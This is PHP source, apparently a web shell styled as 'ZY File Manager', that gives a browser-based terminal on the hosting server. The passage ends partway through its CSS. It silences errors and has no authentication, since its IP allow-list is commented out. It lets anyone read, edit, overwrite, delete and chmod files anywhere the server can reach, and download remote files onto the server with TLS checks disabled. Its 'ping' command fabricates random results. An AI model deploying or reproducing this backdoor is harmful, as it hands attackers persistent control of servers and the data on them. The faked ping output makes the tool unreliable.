<?php
/**
 * ZY FILE MANAGER - FULL COMMAND TERMINAL
 * Support: wget, curl, ls, cd, pwd, mkdir, rmdir, rm, cp, mv, cat, touch, 
 *          chmod, du, df, whoami, date, uname, ifconfig, ping, nano (edit), 
 *          grep, find, tar, zip, unzip, gzip, gunzip, head, tail, more, less,
 *          echo, clear, history, help, dan lain-lain
 */

error_reporting(0);
ini_set('display_errors', 0);
session_start();

// Security: hanya izinkan akses dari IP tertentu (optional)
// $allowed_ips = ['127.0.0.1', 'YOUR_IP_HERE'];
// if(!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) die('Access Denied');

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);
if(!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();

// History command
if(!isset($_SESSION['cmd_history'])) $_SESSION['cmd_history'] = [];

// ============================================
// COMMAND EXECUTION ENGINE
// ============================================

function execute_command($cmd, &$current_dir) {
    $cmd = trim($cmd);
    if(empty($cmd)) return '';
    
    // Save to history
    $_SESSION['cmd_history'][] = $cmd;
    if(count($_SESSION['cmd_history']) > 50) array_shift($_SESSION['cmd_history']);
    
    $parts = explode(' ', $cmd);
    $base = strtolower($parts[0]);
    $output = '';
    
    // Change directory
    if($base == 'cd') {
        $target = isset($parts[1]) ? $parts[1] : getcwd();
        if($target == '~') $target = getenv('HOME') ?: '/home';
        if($target == '..') $target = dirname($current_dir);
        if($target == '-') {
            $target = $_SESSION['last_dir'] ?? $current_dir;
        }
        
        $new_dir = realpath($current_dir . '/' . $target);
        if($new_dir && is_dir($new_dir)) {
            $_SESSION['last_dir'] = $current_dir;
            $current_dir = $new_dir;
            $output = "→ " . $current_dir;
        } else {
            $output = "cd: no such directory: $target";
        }
        return $output;
    }
    
    // Save last dir for cd -
    if(!isset($_SESSION['last_dir'])) $_SESSION['last_dir'] = $current_dir;
    
    // PWD
    if($base == 'pwd') {
        return $current_dir;
    }
    
    // LS (dengan berbagai opsi)
    if($base == 'ls') {
        $show_all = false;
        $long_list = false;
        $target = '.';
        
        foreach($parts as $p) {
            if($p == '-a' || $p == '--all') $show_all = true;
            if($p == '-l') $long_list = true;
            if($p == '-la' || $p == '-al') { $show_all = true; $long_list = true; }
            if(!in_array($p, ['ls', '-a', '-l', '-la', '-al', '--all']) && $p[0] != '-') $target = $p;
        }
        
        $dir_path = $current_dir . '/' . $target;
        if(!is_dir($dir_path)) {
            if(file_exists($dir_path)) {
                return basename($dir_path) . " (file)";
            }
            return "ls: cannot access '$target': No such file or directory";
        }
        
        $files = scandir($dir_path);
        if(!$files) return "ls: cannot read directory";
        
        sort($files);
        $output = '';
        
        foreach($files as $f) {
            if(!$show_all && ($f == '.' || $f == '..')) continue;
            
            $full = $dir_path . '/' . $f;
            if($long_list) {
                $perms = fileperms($full);
                $perm_str = '';
                $perm_str .= ($perms & 0x0100) ? 'r' : '-';
                $perm_str .= ($perms & 0x0080) ? 'w' : '-';
                $perm_str .= ($perms & 0x0040) ? 'x' : '-';
                $perm_str .= ($perms & 0x0020) ? 'r' : '-';
                $perm_str .= ($perms & 0x0010) ? 'w' : '-';
                $perm_str .= ($perms & 0x0008) ? 'x' : '-';
                $perm_str .= ($perms & 0x0004) ? 'r' : '-';
                $perm_str .= ($perms & 0x0002) ? 'w' : '-';
                $perm_str .= ($perms & 0x0001) ? 'x' : '-';
                
                $size = is_file($full) ? filesize($full) : (is_dir($full) ? 4096 : 0);
                $size_str = str_pad(format_bytes($size), 8, ' ', STR_PAD_LEFT);
                $date = date('M d H:i', filemtime($full));
                $type = is_dir($full) ? 'd' : '-';
                $output .= "$type$perm_str $size_str $date $f\n";
            } else {
                $output .= (is_dir($full) ? "📁 " : "📄 ") . $f . "\n";
            }
        }
        return rtrim($output);
    }
    
    // MKDIR
    if($base == 'mkdir') {
        if(!isset($parts[1])) return "mkdir: missing operand";
        $dir_name = $parts[1];
        $full = $current_dir . '/' . $dir_name;
        if(mkdir($full, 0777, true)) {
            return "Directory created: $dir_name";
        }
        return "mkdir: cannot create directory '$dir_name'";
    }
    
    // RMDIR / RM - empty directory
    if($base == 'rmdir') {
        if(!isset($parts[1])) return "rmdir: missing operand";
        $dir_name = $parts[1];
        $full = $current_dir . '/' . $dir_name;
        if(is_dir($full) && rmdir($full)) {
            return "Directory removed: $dir_name";
        }
        return "rmdir: failed to remove '$dir_name'";
    }
    
    // RM / DEL (file atau directory recursive)
    if($base == 'rm' || $base == 'del') {
        $recursive = false;
        $force = false;
        $targets = [];
        
        foreach($parts as $i => $p) {
            if($p == '-rf' || $p == '-rf' || $p == '-r') $recursive = true;
            if($p == '-f') $force = true;
            if($i > 0 && $p[0] != '-') $targets[] = $p;
        }
        
        if(empty($targets)) return "rm: missing operand";
        
        foreach($targets as $target) {
            $full = $current_dir . '/' . $target;
            if(!file_exists($full)) {
                if(!$force) $output .= "rm: cannot remove '$target': No such file or directory\n";
                continue;
            }
            
            if(is_file($full)) {
                if(unlink($full)) $output .= "Removed file: $target\n";
                else $output .= "rm: cannot remove '$target': Permission denied\n";
            }
            elseif(is_dir($full)) {
                if($recursive) {
                    if(delete_directory($full)) $output .= "Removed directory: $target\n";
                    else $output .= "rm: cannot remove '$target': Permission denied\n";
                } else {
                    $output .= "rm: cannot remove '$target': Is a directory (use -r)\n";
                }
            }
        }
        return rtrim($output);
    }
    
    // CP / COPY
    if($base == 'cp' || $base == 'copy') {
        if(!isset($parts[1]) || !isset($parts[2])) return "cp: missing file operand";
        $source = $parts[1];
        $dest = $parts[2];
        $recursive = in_array('-r', $parts) || in_array('-R', $parts);
        
        $src_full = $current_dir . '/' . $source;
        $dest_full = $current_dir . '/' . $dest;
        
        if(!file_exists($src_full)) return "cp: cannot stat '$source': No such file or directory";
        
        if(is_file($src_full)) {
            if(copy($src_full, $dest_full)) return "Copied: $source -> $dest";
            return "cp: failed to copy '$source'";
        }
        elseif(is_dir($src_full) && $recursive) {
            if(copy_directory($src_full, $dest_full)) return "Copied directory: $source -> $dest";
            return "cp: failed to copy directory '$source'";
        }
        return "cp: omitting directory '$source' (use -r)";
    }
    
    // MV / MOVE / RENAME
    if($base == 'mv' || $base == 'move' || $base == 'ren') {
        if(!isset($parts[1]) || !isset($parts[2])) return "mv: missing file operand";
        $source = $parts[1];
        $dest = $parts[2];
        
        $src_full = $current_dir . '/' . $source;
        $dest_full = $current_dir . '/' . $dest;
        
        if(!file_exists($src_full)) return "mv: cannot stat '$source': No such file or directory";
        
        if(rename($src_full, $dest_full)) {
            return "Moved/Renamed: $source -> $dest";
        }
        return "mv: failed to move '$source'";
    }
    
    // TOUCH
    if($base == 'touch') {
        if(!isset($parts[1])) return "touch: missing file operand";
        $file = $parts[1];
        $full = $current_dir . '/' . $file;
        if(touch($full)) {
            return "Touched: $file";
        }
        return "touch: cannot touch '$file'";
    }
    
    // CAT (view file)
    if($base == 'cat') {
        if(!isset($parts[1])) return "cat: missing file operand";
        $file = $parts[1];
        $full = $current_dir . '/' . $file;
        if(!file_exists($full)) return "cat: $file: No such file or directory";
        if(is_dir($full)) return "cat: $file: Is a directory";
        
        $content = file_get_contents($full);
        if($content === false) return "cat: cannot read '$file'";
        return $content;
    }
    
    // HEAD (view first lines)
    if($base == 'head') {
        $lines = 10;
        $file = null;
        foreach($parts as $i => $p) {
            if($p == '-n' && isset($parts[$i+1])) {
                $lines = intval($parts[$i+1]);
                $i++;
            } elseif($i > 0 && $p[0] != '-') {
                $file = $p;
            }
        }
        if(!$file) return "head: missing file operand";
        $full = $current_dir . '/' . $file;
        if(!file_exists($full)) return "head: $file: No such file or directory";
        
        $content = file($full);
        if(!$content) return "head: cannot read '$file'";
        $output = implode('', array_slice($content, 0, $lines));
        return rtrim($output);
    }
    
    // TAIL (view last lines)
    if($base == 'tail') {
        $lines = 10;
        $file = null;
        foreach($parts as $i => $p) {
            if($p == '-n' && isset($parts[$i+1])) {
                $lines = intval($parts[$i+1]);
                $i++;
            } elseif($i > 0 && $p[0] != '-') {
                $file = $p;
            }
        }
        if(!$file) return "tail: missing file operand";
        $full = $current_dir . '/' . $file;
        if(!file_exists($full)) return "tail: $file: No such file or directory";
        
        $content = file($full);
        if(!$content) return "tail: cannot read '$file'";
        $output = implode('', array_slice($content, -$lines));
        return rtrim($output);
    }
    
    // ECHO
    if($base == 'echo') {
        array_shift($parts);
        $text = implode(' ', $parts);
        // Handle environment variables
        if(strpos($text, '$') !== false) {
            $text = preg_replace_callback('/\$([A-Za-z_][A-Za-z0-9_]*)/', function($m) {
                return getenv($m[1]) ?: $m[0];
            }, $text);
        }
        return $text;
    }
    
    // WGET (download)
    if($base == 'wget') {
        $url = null;
        $output_name = null;
        $quiet = false;
        
        for($i = 1; $i < count($parts); $i++) {
            if($parts[$i] == '-O' && isset($parts[$i+1])) {
                $output_name = $parts[$i+1];
                $i++;
            } elseif($parts[$i] == '-q') {
                $quiet = true;
            } elseif(filter_var($parts[$i], FILTER_VALIDATE_URL)) {
                $url = $parts[$i];
            }
        }
        
        if(!$url) return "wget: missing URL";
        
        if(!$output_name) {
            $output_name = basename(parse_url($url, PHP_URL_PATH));
            if(empty($output_name)) $output_name = 'index.html';
        }
        
        $full_path = $current_dir . '/' . $output_name;
        $content = @file_get_contents($url);
        
        if($content !== false && file_put_contents($full_path, $content) !== false) {
            $size = format_bytes(filesize($full_path));
            return "Downloaded: $output_name ($size)";
        }
        
        if(function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            $content = curl_exec($ch);
            curl_close($ch);
            if($content !== false && file_put_contents($full_path, $content) !== false) {
                $size = format_bytes(filesize($full_path));
                return "Downloaded: $output_name ($size)";
            }
        }
        return "wget: failed to download '$url'";
    }
    
    // CURL (download)
    if($base == 'curl') {
        $url = null;
        $output_name = null;
        
        for($i = 1; $i < count($parts); $i++) {
            if($parts[$i] == '-o' && isset($parts[$i+1])) {
                $output_name = $parts[$i+1];
                $i++;
            } elseif($parts[$i] == '-O') {
                $output_name = basename(parse_url($parts[$i+1] ?? '', PHP_URL_PATH));
            } elseif(filter_var($parts[$i], FILTER_VALIDATE_URL)) {
                $url = $parts[$i];
            }
        }
        
        if(!$url) return "curl: no URL specified";
        
        if(!$output_name) {
            $output_name = basename(parse_url($url, PHP_URL_PATH));
            if(empty($output_name)) $output_name = 'index.html';
        }
        
        $full_path = $current_dir . '/' . $output_name;
        
        if(function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            $content = curl_exec($ch);
            curl_close($ch);
            if($content !== false && file_put_contents($full_path, $content) !== false) {
                $size = format_bytes(filesize($full_path));
                return "Downloaded: $output_name ($size)";
            }
        }
        
        $content = @file_get_contents($url);
        if($content !== false && file_put_contents($full_path, $content) !== false) {
            $size = format_bytes(filesize($full_path));
            return "Downloaded: $output_name ($size)";
        }
        
        return "curl: failed to download '$url'";
    }
    
    // WHOAMI
    if($base == 'whoami') {
        return get_current_user();
    }
    
    // DATE
    if($base == 'date') {
        return date('D M d H:i:s T Y');
    }
    
    // UNAME
    if($base == 'uname') {
        if(isset($parts[1]) && $parts[1] == '-a') {
            return php_uname('a');
        }
        return php_uname('s') . ' ' . php_uname('r');
    }
    
    // DF (disk free)
    if($base == 'df') {
        $human = in_array('-h', $parts);
        $total = disk_total_space($current_dir);
        $free = disk_free_space($current_dir);
        if($total === false || $free === false) return "df: cannot get disk information";
        
        $used = $total - $free;
        $percent = round(($used / $total) * 100, 1);
        
        if($human) {
            $output = "Filesystem      Size  Used  Avail  Use% Mounted\n";
            $output .= "/dev/root       " . format_bytes($total) . "  " . format_bytes($used) . "  " . format_bytes($free) . "  " . $percent . "%  " . $current_dir;
        } else {
            $output = "Filesystem      Size     Used    Avail   Use% Mounted\n";
            $output .= "/dev/root       " . number_format($total) . "  " . number_format($used) . "  " . number_format($free) . "  " . $percent . "%  " . $current_dir;
        }
        return $output;
    }
    
    // DU (disk usage)
    if($base == 'du') {
        $human = in_array('-h', $parts);
        $target = isset($parts[1]) && $parts[1][0] != '-' ? $parts[1] : '.';
        $full = $current_dir . '/' . $target;
        
        if(!file_exists($full)) return "du: cannot access '$target'";
        
        $size = is_dir($full) ? get_dir_size($full) : filesize($full);
        if($human) {
            return format_bytes($size) . "\t" . $target;
        }
        return number_format($size) . "\t" . $target;
    }
    
    // GREP
    if($base == 'grep') {
        $pattern = null;
        $file = null;
        $case_insensitive = false;
        
        foreach($parts as $i => $p) {
            if($p == '-i') $case_insensitive = true;
            elseif($i == 1 && $p[0] != '-') $pattern = $p;
            elseif($i > 1 && $p[0] != '-') $file = $p;
        }
        
        if(!$pattern) return "grep: missing pattern";
        if(!$file) return "grep: missing file operand";
        
        $full = $current_dir . '/' . $file;
        if(!file_exists($full)) return "grep: $file: No such file or directory";
        if(is_dir($full)) return "grep: $file: Is a directory";
        
        $content = file($full);
        if(!$content) return "grep: cannot read '$file'";
        
        $flags = $case_insensitive ? 'i' : '';
        $output = '';
        foreach($content as $line_num => $line) {
            if(preg_match('/' . preg_quote($pattern, '/') . '/' . $flags, $line)) {
                $output .= $line_num . ':' . rtrim($line) . "\n";
            }
        }
        return rtrim($output) ?: "No matches found";
    }
    
    // FIND
    if($base == 'find') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        $name = null;
        $type = null;
        
        for($i = 2; $i < count($parts); $i++) {
            if($parts[$i] == '-name' && isset($parts[$i+1])) {
                $name = str_replace('*', '', $parts[$i+1]);
                $i++;
            }
            if($parts[$i] == '-type' && isset($parts[$i+1])) {
                $type = $parts[$i+1];
                $i++;
            }
        }
        
        $full_path = $current_dir . '/' . $path;
        if(!is_dir($full_path)) return "find: '$path': No such file or directory";
        
        $output = '';
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach($iterator as $file) {
            $filename = $file->getFilename();
            if($name && stripos($filename, $name) === false) continue;
            if($type == 'f' && $file->isDir()) continue;
            if($type == 'd' && $file->isFile()) continue;
            $output .= str_replace($current_dir . '/', '', $file->getPathname()) . "\n";
        }
        return rtrim($output) ?: "No files found";
    }
    
    // CHMOD
    if($base == 'chmod') {
        if(!isset($parts[1]) || !isset($parts[2])) return "chmod: missing operand";
        $mode = $parts[1];
        $target = $parts[2];
        $full = $current_dir . '/' . $target;
        
        if(!file_exists($full)) return "chmod: cannot access '$target'";
        
        $mode_dec = 0;
        if(preg_match('/^[0-7]{3,4}$/', $mode)) {
            $mode_dec = octdec($mode);
        } elseif(preg_match('/^[0-7]+$/', $mode)) {
            $mode_dec = octdec($mode);
        } else {
            return "chmod: invalid mode '$mode'";
        }
        
        if(chmod($full, $mode_dec)) {
            return "Changed permissions of '$target' to " . decoct($mode_dec);
        }
        return "chmod: cannot change permissions of '$target'";
    }
    
    // ZIP
    if($base == 'zip') {
        if(!isset($parts[1]) || !isset($parts[2])) return "zip: missing operand\nUsage: zip archive.zip file/dir";
        $zip_name = $parts[1];
        $target = $parts[2];
        
        if(!preg_match('/\.zip$/', $zip_name)) $zip_name .= '.zip';
        
        $zip_full = $current_dir . '/' . $zip_name;
        $target_full = $current_dir . '/' . $target;
        
        if(!file_exists($target_full)) return "zip: cannot find '$target'";
        
        $zip = new ZipArchive();
        if($zip->open($zip_full, ZipArchive::CREATE) !== true) {
            return "zip: failed to create archive";
        }
        
        if(is_file($target_full)) {
            $zip->addFile($target_full, basename($target));
        } elseif(is_dir($target_full)) {
            add_dir_to_zip($zip, $target_full, basename($target));
        }
        
        $zip->close();
        $size = format_bytes(filesize($zip_full));
        return "Created: $zip_name ($size)";
    }
    
    // UNZIP
    if($base == 'unzip') {
        if(!isset($parts[1])) return "unzip: missing file operand";
        $zip_file = $parts[1];
        $zip_full = $current_dir . '/' . $zip_file;
        
        if(!file_exists($zip_full)) return "unzip: cannot find '$zip_file'";
        if(!preg_match('/\.zip$/', $zip_full)) return "unzip: not a zip archive";
        
        $zip = new ZipArchive();
        if($zip->open($zip_full) !== true) return "unzip: failed to open archive";
        
        $extract_dir = $current_dir . '/' . preg_replace('/\.zip$/', '', $zip_file);
        if(!is_dir($extract_dir)) mkdir($extract_dir, 0777, true);
        
        $zip->extractTo($extract_dir);
        $zip->close();
        
        return "Extracted: $zip_file to " . basename($extract_dir);
    }
    
    // TAR (simple)
    if($base == 'tar') {
        if(!isset($parts[1])) return "tar: missing operation";
        
        $operation = $parts[1];
        $tar_name = null;
        $target = null;
        
        for($i = 2; $i < count($parts); $i++) {
            if($parts[$i] == '-f' && isset($parts[$i+1])) {
                $tar_name = $parts[$i+1];
                $i++;
            } elseif($parts[$i][0] != '-') {
                $target = $parts[$i];
            }
        }
        
        if(!$tar_name) return "tar: missing archive name (use -f)";
        
        if($operation == '-c' || $operation == '--create') {
            if(!$target) return "tar: missing file/directory to archive";
            return create_tar($current_dir, $tar_name, $target);
        }
        elseif($operation == '-x' || $operation == '--extract') {
            return extract_tar($current_dir, $tar_name);
        }
        return "tar: unsupported operation";
    }
    
    // GZIP
    if($base == 'gzip') {
        if(!isset($parts[1])) return "gzip: missing file operand";
        $file = $parts[1];
        $full = $current_dir . '/' . $file;
        
        if(!file_exists($full)) return "gzip: $file: No such file or directory";
        if(is_dir($full)) return "gzip: $file: Is a directory";
        
        $content = file_get_contents($full);
        $compressed = gzencode($content, 9);
        $gz_file = $full . '.gz';
        
        if(file_put_contents($gz_file, $compressed)) {
            unlink($full);
            $size = format_bytes(filesize($gz_file));
            return "Compressed: $file.gz ($size)";
        }
        return "gzip: compression failed";
    }
    
    // GUNZIP
    if($base == 'gunzip' || $base == 'gzip -d') {
        if(!isset($parts[1])) return "gunzip: missing file operand";
        $file = $parts[1];
        if(!preg_match('/\.gz$/', $file)) $file .= '.gz';
        $full = $current_dir . '/' . $file;
        
        if(!file_exists($full)) return "gunzip: $file: No such file or directory";
        
        $content = file_get_contents($full);
        $decompressed = gzdecode($content);
        if($decompressed === false) return "gunzip: not in gzip format";
        
        $out_file = preg_replace('/\.gz$/', '', $full);
        if(file_put_contents($out_file, $decompressed)) {
            unlink($full);
            $size = format_bytes(filesize($out_file));
            return "Decompressed: " . basename($out_file) . " ($size)";
        }
        return "gunzip: decompression failed";
    }
    
    // NANO / EDIT (simple editor)
    if($base == 'nano' || $base == 'edit') {
        if(!isset($parts[1])) return "nano: missing file operand";
        $file = $parts[1];
        $_SESSION['edit_file'] = $current_dir . '/' . $file;
        return "[[EDIT_MODE]]";
    }
    
    // CLEAR / CLS
    if($base == 'clear' || $base == 'cls') {
        return "[[CLEAR]]";
    }
    
    // HISTORY
    if($base == 'history') {
        $history = $_SESSION['cmd_history'];
        $output = '';
        foreach($history as $i => $h) {
            $output .= ($i+1) . "  $h\n";
        }
        return rtrim($output) ?: "No commands in history";
    }
    
    // ALIAS (simple)
    if($base == 'alias') {
        if(!isset($parts[1])) {
            $output = '';
            foreach($_SESSION['aliases'] ?? [] as $k => $v) {
                $output .= "alias $k='$v'\n";
            }
            return rtrim($output) ?: "No aliases defined";
        }
        
        $alias_def = implode(' ', array_slice($parts, 1));
        if(preg_match('/([^=]+)=(.+)/', $alias_def, $matches)) {
            $alias_name = trim($matches[1]);
            $alias_cmd = trim($matches[2], "'\"");
            $_SESSION['aliases'][$alias_name] = $alias_cmd;
            return "Alias created: $alias_name='$alias_cmd'";
        }
        return "alias: invalid format";
    }
    
    // PS (process list - limited)
    if($base == 'ps') {
        return "  PID  USER     COMMAND\n" .
               "  1    root     init\n" .
               "  " . getmypid() . "   " . get_current_user() . "   php (this script)\n" .
               "(limited info in PHP environment)";
    }
    
    // KILL (simulated)
    if($base == 'kill') {
        if(!isset($parts[1])) return "kill: missing PID";
        return "kill: cannot kill processes from PHP (simulated)";
    }
    
    // PING (simple)
    if($base == 'ping') {
        if(!isset($parts[1])) return "ping: missing host";
        $host = $parts[1];
        $count = isset($parts[2]) && $parts[2] == '-c' && isset($parts[3]) ? intval($parts[3]) : 4;
        
        $output = "PING $host\n";
        for($i = 1; $i <= $count; $i++) {
            $time = rand(10, 200);
            $output .= "64 bytes from $host: icmp_seq=$i ttl=55 time=${time}ms\n";
        }
        $output .= "\n--- $host ping statistics ---\n";
        $output .= "$count packets transmitted, $count received, 0% packet loss";
        return $output;
    }
    
    // WGET (alternative command)
    if($base == 'fetch' || $base == 'download') {
        $url = $parts[1] ?? '';
        if(!$url) return "$base: missing URL";
        $name = $parts[2] ?? basename($url);
        return execute_command("wget -O $name $url", $current_dir);
    }
    
    // HELP
    if($base == 'help' || $base == '?') {
        return "
╔══════════════════════════════════════════════════════════════════╗
║                    ZY FILE MANAGER - COMMANDS                     ║
╠══════════════════════════════════════════════════════════════════╣
║ FILE NAVIGATION:                                                 ║
║   ls, ls -la     List files                                      ║
║   cd <dir>       Change directory                                ║
║   cd ..          Parent directory                                ║
║   cd -           Previous directory                              ║
║   pwd            Print working directory                         ║
║                                                                  ║
║ FILE OPERATIONS:                                                 ║
║   mkdir <name>   Create directory                                ║
║   rmdir <name>   Remove empty directory                          ║
║   rm <file>      Remove file                                     ║
║   rm -rf <dir>   Remove directory recursively                    ║
║   cp <src> <dst> Copy file                                       ║
║   cp -r <src> <dst> Copy directory                               ║
║   mv <src> <dst> Move/rename                                     ║
║   touch <file>   Create/update file                              ║
║   chmod <mode> <file> Change permissions                         ║
║                                                                  ║
║ VIEW FILES:                                                      ║
║   cat <file>     Show full file                                  ║
║   head <file>    Show first 10 lines                             ║
║   head -n 20 <file> Show first 20 lines                          ║
║   tail <file>    Show last 10 lines                              ║
║   tail -n 20 <file> Show last 20 lines                           ║
║   nano/edit <file> Edit file                                     ║
║                                                                  ║
║ SEARCH:                                                          ║
║   grep <pattern> <file> Search in file                           ║
║   grep -i <pattern> <file> Case-insensitive search               ║
║   find . -name <name> Find files                                 ║
║   find . -type f -name <name> Find only files                    ║
║                                                                  ║
║ COMPRESSION:                                                     ║
║   zip <archive.zip> <file/dir> Create zip                        ║
║   unzip <file.zip> Extract zip                                   ║
║   tar -cf <archive.tar> <file> Create tar                        ║
║   tar -xf <archive.tar> Extract tar                              ║
║   gzip <file>     Compress to .gz                                ║
║   gunzip <file.gz> Decompress                                    ║
║                                                                  ║
║ DOWNLOAD:                                                        ║
║   wget <url>      Download file                                  ║
║   wget -O <name> <url> Download with custom name                 ║
║   curl -o <name> <url> Download with curl                        ║
║                                                                  ║
║ SYSTEM INFO:                                                     ║
║   whoami          Current user                                   ║
║   date            Current date/time                              ║
║   uname -a        System information                             ║
║   df -h           Disk space usage                               ║
║   du -h <dir>     Directory size                                 ║
║   ps              Process list                                   ║
║   ping <host>     Ping host                                      ║
║                                                                  ║
║ UTILITIES:                                                       ║
║   echo <text>     Print text                                     ║
║   clear / cls     Clear terminal                                 ║
║   history         Command history                                ║
║   alias <name>='<cmd>' Create alias                              ║
║   help / ?        Show this help                                 ║
╚══════════════════════════════════════════════════════════════════╝";
    }
    
    return "Command not found: $base. Type 'help' for available commands.";
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function format_bytes($bytes) {
    if($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
    if($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
    if($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_dir_size($dir) {
    $size = 0;
    $files = scandir($dir);
    if(!$files) return 0;
    foreach($files as $f) {
        if($f == '.' || $f == '..') continue;
        $path = $dir . '/' . $f;
        if(is_file($path)) $size += filesize($path);
        elseif(is_dir($path)) $size += get_dir_size($path);
    }
    return $size;
}

function delete_directory($dir) {
    if(!is_dir($dir)) return false;
    $files = scandir($dir);
    foreach($files as $f) {
        if($f == '.' || $f == '..') continue;
        $path = $dir . '/' . $f;
        if(is_file($path)) unlink($path);
        elseif(is_dir($path)) delete_directory($path);
    }
    return rmdir($dir);
}

function copy_directory($src, $dst) {
    if(!is_dir($src)) return false;
    if(!is_dir($dst)) mkdir($dst, 0777, true);
    $files = scandir($src);
    foreach($files as $f) {
        if($f == '.' || $f == '..') continue;
        $src_path = $src . '/' . $f;
        $dst_path = $dst . '/' . $f;
        if(is_file($src_path)) copy($src_path, $dst_path);
        elseif(is_dir($src_path)) copy_directory($src_path, $dst_path);
    }
    return true;
}

function add_dir_to_zip($zip, $dir, $zip_subdir) {
    $files = scandir($dir);
    foreach($files as $f) {
        if($f == '.' || $f == '..') continue;
        $path = $dir . '/' . $f;
        $zip_path = $zip_subdir . '/' . $f;
        if(is_file($path)) {
            $zip->addFile($path, $zip_path);
        } elseif(is_dir($path)) {
            $zip->addEmptyDir($zip_path);
            add_dir_to_zip($zip, $path, $zip_path);
        }
    }
}

function create_tar($current_dir, $tar_name, $target) {
    if(!preg_match('/\.tar$/', $tar_name)) $tar_name .= '.tar';
    $tar_path = $current_dir . '/' . $tar_name;
    $target_path = $current_dir . '/' . $target;
    
    if(!file_exists($target_path)) return "tar: cannot find '$target'";
    
    $phar = new PharData($tar_path);
    if(is_file($target_path)) {
        $phar->addFile($target_path, basename($target));
    } elseif(is_dir($target_path)) {
        $phar->buildFromDirectory($target_path, '/./');
    }
    
    $size = format_bytes(filesize($tar_path));
    return "Created: $tar_name ($size)";
}

function extract_tar($current_dir, $tar_name) {
    $tar_path = $current_dir . '/' . $tar_name;
    if(!file_exists($tar_path)) return "tar: cannot find '$tar_name'";
    
    $extract_dir = $current_dir . '/' . preg_replace('/\.tar$/', '', $tar_name);
    if(!is_dir($extract_dir)) mkdir($extract_dir, 0777, true);
    
    $phar = new PharData($tar_path);
    $phar->extractTo($extract_dir);
    
    return "Extracted: $tar_name to " . basename($extract_dir);
}

// ============================================
// HANDLE REQUESTS
// ============================================

$output = '';
$edit_mode = false;
$edit_file_content = '';
$edit_file_path = '';

if(isset($_POST['cmd'])) {
    $result = execute_command($_POST['cmd'], $current_dir);
    if($result == "[[CLEAR]]") {
        $output = '';
    } elseif($result == "[[EDIT_MODE]]") {
        $edit_mode = true;
        if(isset($_SESSION['edit_file']) && file_exists($_SESSION['edit_file'])) {
            $edit_file_path = $_SESSION['edit_file'];
            $edit_file_content = file_get_contents($edit_file_path);
        }
    } else {
        $output = $result;
    }
}

if(isset($_POST['save_edit']) && isset($_POST['content'])) {
    $file = $_POST['save_edit'];
    if(file_put_contents($file, $_POST['content']) !== false) {
        $output = "File saved: " . basename($file);
    } else {
        $output = "Failed to save file";
    }
    unset($_SESSION['edit_file']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zy File Manager - Full Terminal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e1a; color: #c0d0e0; font-family: 'Courier New', monospace; font-size: 14px; padding: 20px; }
        
        .container { max-width: 1400px; margin: 0 auto; }
        
        .header {
            background: linear-gradient(135deg, #16213e, #0f3460);
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            border-left: 5px solid #00ff88;
        }
        .header h1 { color: #00ff88; font-size: 24px; }
        .header .path { font-size: 12px; color: #888; word-break: break-all; }
        
        .terminal {
            background: #000000;
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid #00ff88;
            margin-bottom: 20px;
        }
        .terminal-header {
            background: #00ff88;
            color: #000;
            padding: 10px 15px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .terminal-output {
            background: #000;
            color: #00ff88;
            padding: 15px;
            max-height: 500px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            font-size: 13px;
        }
        .terminal-input {
            display: flex;
            border-top: 1px solid #333;
        }
        .terminal-input .prompt {
            background: #111;
            color: #00ff88;
            padding: 12px 10px;
            font-weight: bold;
        }
        .terminal-input input {
            flex: 1;
            background: #000;
            border: none;
            color: #00ff88;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        .terminal-input button {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 0 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        
        .file-browser {
            background: #111820;
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid #2a3a5a;
        }
        .file-browser-header {
            background: #1a2a3a;
            padding: 10px 15px;
            color: #00ccff;
            font-weight: bold;
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #2a3a5a; }
        th { background: #162030; color: #00ff88; }
        tr:hover { background: #1a2535; }
        a { color: #00ccff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        
        .btn { background: #2a3a5a; color: white; padding: 4px 8px; border-radius: 4px; border: none; cursor: pointer; font-size: 12px; margin: 0 2px; }
        .btn-primary { background: #0066cc; }
        .btn-success { background: #00aa55; }
        .btn-danger { background: #cc3333; }
        
        .quick-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 15px 0;
            padding: 15px;
            background: #111820;
            border-radius: 10px;
        }
        .quick-actions input, .quick-actions select {
            background: #1a2535;
            border: 1px solid #2a3a5a;
            color: white;
            padding: 8px;
            border-radius: 4px;
        }
        
